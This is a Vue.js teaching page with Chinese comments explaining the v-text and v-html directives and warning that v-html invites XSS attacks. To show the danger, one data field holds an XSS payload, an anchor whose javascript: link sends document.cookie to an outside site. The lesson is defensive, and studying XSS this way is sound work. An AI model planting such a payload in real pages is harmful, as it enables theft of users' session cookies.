<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>27_v-text和v-html指令</title>
    <script src="../js/vue.js"></script>
</head>

<body>
    <!-- 
        我们学过的指令:
            v-bind  ：单向绑定解析表达式，可简写成 :xxx
            v-model ：双向数据绑定  适用于表单
            v-for   ：遍历数组/对象/字符串
            v-on    ：绑定事件监听，可简写为@
            v-if    ：条件渲染(动态控制节点是否存在)
            v-else  ：条件渲染(动态控制节点是否存在)
            v-show  ：条件渲染(动态控制节点是否展示)

        v-text指令：
            1.作用:向其所在的节点中渲染文本内容，不支持结构的解析
            2.与插值语法的区别：v-text会替换掉节点中的内容，{{xxx}}则不会
        v-html指令:
            1.作用:向指定节点中渲染包含html结构的内容
            2.与插值语法的区别:
                ①.v-html会替换掉节点中所有的内容，{{xxx}}则不会
                ②.v-html可以识别html结构
            3.严重注意：v-html有安全性问题！！！
                ①.在网站上动态渲染任意HTML是非常危险的，容易导致xss攻击
                ②.一定要在可信的内容上使用v-html,永远不要在用户提交的内容上
     -->
    <div id="root">
        <!-- v-text里的数据会直接替换标签里的内容 要是msg里有标签不会转译 <h1>你好啊</h1> -->
        <h2 v-text="msg">尚硅谷</h2>
        <div v-html="str"></div>
        <div v-html="str2"></div>
    </div>
    <script>
        new Vue({
            el: "#root",
            data: {
                msg:"你好啊",
                str:"<h2>你好啊~</h2>",
                str2:"<a href=javascript:location.href='http://www.baidu.com?'+document.cookie>兄弟我找到你了</a>"
            }
        })
    </script>
</body>

</html>
